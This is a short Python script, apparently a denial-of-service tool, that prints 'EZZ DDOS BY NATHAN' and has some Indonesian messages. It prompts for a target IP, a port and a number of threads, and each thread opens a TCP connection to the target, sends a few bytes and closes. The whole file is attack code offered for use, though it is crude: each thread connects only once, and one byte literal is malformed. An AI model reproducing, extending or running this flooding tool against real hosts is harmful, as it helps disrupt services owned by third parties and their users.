import socket
import threading

ip = str(input("IP Target :"))
port = int(input("Port : "))
th = int(input("Threads : "))

def tcp(ip,port):
    tcp=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    tcp.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY, 1)
    try:
        tcp.connect((ip,port))
        tcp.send(b"\x00\x00\x00x80")
        tcp.close()
        print(f"EZZ DDOS BY NATHAN {ip}:{port}")
    except socket.timeout:
        print(f"Koneksi ke {ip}:{port} timeout")
    except Exception as e:
        print(f"Error: {e}")
        
for i in range(th):
    t = threading.Thread(target=tcp, args=(ip, port))
    t.start()